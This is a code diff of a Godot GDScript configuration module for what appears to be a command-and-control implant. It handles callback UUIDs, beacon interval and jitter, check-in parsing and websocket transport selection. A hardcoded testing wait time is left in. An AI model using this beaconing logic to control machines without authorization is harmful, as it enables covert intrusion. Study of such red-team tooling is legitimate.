@@ -1,11 +1,12 @@
 extends Node
 
-const FILE_NAME = "res://config_websocket.json"
+enum TRANSPORT_TYPE {WEBSOCKET, HTTP, TCP}
+const TransportWebsocket = preload("res://transport/websocket.gd")
 
-var setting = {
-	"payload_uuid": false,
-	"callback_uuid": false
-}
+const FILE_NAME = "res://config_zippy-websocket.json"
+const MAX_CONNECT_ATTEMPT = 3
+
+var setting = {}
 
 var rng
 
@@ -25,7 +26,7 @@ func _ready():
 		file.close()
 
 		if typeof(data) == TYPE_DICTIONARY:
-			print(data)
+			print("config: ", data)
 			setting = data
 		else:
 			printerr("Corrupted data!")
@@ -55,6 +56,9 @@ func get_callback_uuid():
 
 	return ""
 
+func set_callback_period(period:int):
+	setting["callback_interval"] = int(period)
+
 func get_callback_wait_time():
 
 	var callback_period = 10 # unit seconds
@@ -64,23 +68,28 @@ func get_callback_wait_time():
 		callback_period = int(setting.get("callback_interval"))
 
 	if setting.has("callback_jitter"):
-		callback_jitter = float(float(setting.get("callback_jitter")) / 2.0)
+		callback_jitter = int(setting.get("callback_jitter"))
 
 	if callback_jitter > callback_period:
 		callback_period = callback_jitter # TODO: can we do better than this?
 
-	var rr = rng.randi_range(callback_jitter*-1, callback_jitter)
-	print("get_callback_wait_time: ", rr)
+	var rr = rng.randi() % callback_period*1.1
+	
+	if rr < callback_jitter/1.2:
+		rr *=-1
 	
 	var wait_time = callback_period + rr
-	
+
 	if wait_time <= 0:
 		wait_time = 1
+	
+	wait_time += sleep_time
 
-	print("\n\nget_callback_wait_time: %d" %[wait_time])
-	wait_time = 2
+	wait_time = 2#  TODO nuke this once we're done testing...
 
-	return wait_time + sleep_time
+	sleep_time = 0
+
+	return wait_time
 
 func get_headers():
 	var headers = PackedStringArray()
@@ -105,9 +114,31 @@ func get_callback_uri():
 	if setting.has("ENDPOINT_REPLACE"):
 		callback_host += "/%s" % setting.get("ENDPOINT_REPLACE")
 
-	print("callback_host: %s" % callback_host)
-
 	return callback_host
 
 func set_callback_uuid(uuid):
 	setting["callback_uuid"] = uuid
+
+func get_transport(transport, agent):
+	var uri = get_callback_uri()
+
+	if uri.begins_with("ws"):
+		return TransportWebsocket.new($".", agent, transport)	
+
+	return null
+
+func is_checkin_complete():
+	return get_callback_uuid() != ""
+		
+
+func get_uuid():
+	var uuid = get_payload_uuid()
+
+	if is_checkin_complete():
+		uuid = get_callback_uuid()
+
+	return uuid
+
+func parse_checkin(data):
+	# TODO: enc/dec key parsing / init?
+	set_callback_uuid(data.get("payload").get("id"))
